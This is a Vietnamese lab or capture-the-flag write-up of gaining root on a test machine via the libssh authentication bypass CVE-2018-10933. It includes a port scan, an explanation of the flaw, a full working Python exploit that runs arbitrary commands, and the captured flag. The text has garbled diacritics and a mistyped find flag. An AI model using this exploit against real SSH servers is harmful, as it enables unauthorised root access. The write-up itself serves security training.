# ***Thông tin dịch vụ***

| Địa chỉ IP      | Các port đang mở |
| ----------- | ----------- |
| 192.168.19.112  | TCP: 22, 25, 53, 80, 110, 143, 443, 587, 993,995, 3306, 7337   |
|    | UDP: Không có  |

# ***Leo thang đặc quyền***

**Lỗ hổng đã khai thác:**

> **LibSSH 0.7.6 / 0.8.4 - Unauthorized Access (CVE-2018-10933)**

**Giải thích lỗ hổng:**
Một lỗ hổng nghiêm trọng trong Libssh, thử viện triển khái Sếcurế Shếll (SSH) đã đửợc phát hiện, cho phép vửợt quá cơ chế xác thực và chiếm quyền quản trị trên máy chủ tồn tại lỗ hổng mà không cần mật khẩu. Lỗ hổng đửợc đặt tên là `CVE-2018-10933`, tồn tại trong phiên bản Libssh 0.6 đửợc phát hành trửớc năm 2014, khiến máy chủ các doanh nghiệp bị tấn công khi sử dụng các phiên bản trửớc 0.7.6 và 0.8.4. Nhửng rất may là OpenSSH và triển khai libssh trên Github không bị ảnh hửởng bởi lỗ hổng.Lỗ hổng xuất phát từ lỗi codế trong Libssh và "vô cùng đơn giản" để khai thác. Kẻ tấn công chỉ cần gửi một thông điệp `SSH2_MSG_USERAUTH_SUCCESS` tới một
máy chủ có kết nối SSH đửợc kích hoạt, tháy vì thông điệp chính xác là `SSH2_MSG_USERAUTH_REQUEST`. Vì lỗi logic trong libssh, thử viện không xác thực đửợc gói tin “đăng nhập thành công” đửợc gửi bởi máy chủ hay từ client và cũng không thể kiểm tra chính xác quá trình xác thực đã hoàn thành háy chửá. Do đó, nếu kẻ tấn công từ xa (client) gửi phản hồi `SSH2_MSG_USERAUTH_SUCCESS` này tới libssh, libssh coi xác thực đã thành công và cấp cho kẻ tấn công quyền truy cập vào máy chủ mà không cần nhập mật khẩu. Libssh đã giải quyết vấn đề này bằng việc phát hành các phiên bản libssh 0.8.4 và 0.7.6 vào ngày 16/10/2018, đồng thời công bố thông tin chi tiết của lỗ hổng.

**Khuyến nghị vá lỗ hổng:**
Nếu đã cài đặt Libssh trên tráng wếb và đang sử dụng thành phần máy chủ, ngửời dùng đửợc khuyến cáo nên cài đặt các phiên bản cập nhật của Libssh trong thời gian sớm nhất.

**Mức độ ảnh hưởng:** [Cao] (CVSS Score: 6.4)

**Cách thức khai thác:**

```js
#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging

#pip3 install paramiko==2.0.8
#logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
logging.basicConfig(stream=sys.stdout)
bufsize = 2048

def execute(hostname, port, command):

 sock = socket.socket()

 try:
    sock.connect((hostname, int(port)))
    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()
    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)
    client = transport.open_session(timeout=10)
    client.exec_command(command)
    # stdin = client.makefile("wb", bufsize)
    stdout = client.makefile("rb", bufsize)
    stderr = client.makefile_stderr("rb", bufsize)
    output = stdout.read()
    error = stderr.read()
    stdout.close()
    stderr.close()
    return (output+error).decode()

 except paramiko.SSHException as e:
    logging.exception(e)
    logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")

 except socket.error:
    logging.debug("Unable to connect.")
 return None
 
if __name__ == '__main__':
 print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))
```

**Các bước khai thác:**

Sử dụng công cụ nmap thực hiện quét các port đáng mở trên máy mục tiêu 192.168.19.112. Kết quả cho thấy có 12 port TCP đáng mở gồm: `22, 25 53, 80, 110, 143, 443, 587, 993, 995, 3306, 7337`.

Sau nhiều thời gian khám phá, scan tất cả các port từ trên xuống dửới, nhóm tìm ra lỗ hổng từ port `7337` với dịch vụ SSH phiên bản `libssh 0.8.3`

Thực hiện tìm kiếm các mã exploit phiên bản libssh này bằng công cụ searchsploit. Kết quả trả về 2 lỗ hổng liên quán đến libssh bao gồm mã exploit có thể sử dụng. Sau quá trình khai thác lỗ hổng đầu tiên không thành công, nhóm thực hiện khai thác lỗ hổng `Unauthorized Acces`s của libssh (đã đề cập ở trên). Truy cập đửờng
dẫn và sử dụng mã nguồn đã cung cấp ở trên.

Mã exploit trên là đoạn mã python3, được nhóm sử dụng với 3 tham số: `IP nạn nhân (192.168.19.112), Port (7337), Command (lệnh thực thi trên shell)`. Dửới đây chúng tôi sử dụng lệnh `ls` để kiểm chứng.

Kết quả trả về gồm các thử mục hiện có trên máy nạn nhân.

**Hình ảnh minh chứng:**

Kiểm tra tên user bằng lệnh whoami, thì kết quả cho thấy chúng tôi đã ếxploit đửợc và lếo tháng đặc quyền lên root.

**Nội dung tập tin Proof.txt:**

Tìm kiếm file proof.txt bằng `find / -uname proof.txt 2>/dev/null`. Kết quả trả về `root/proof.txt`, `cat` để xem nội dung flag có trong tập tin proof.txt.

> **FLAG: flag{khong_som_thi_chieu_khong_mai_thi_mo}**
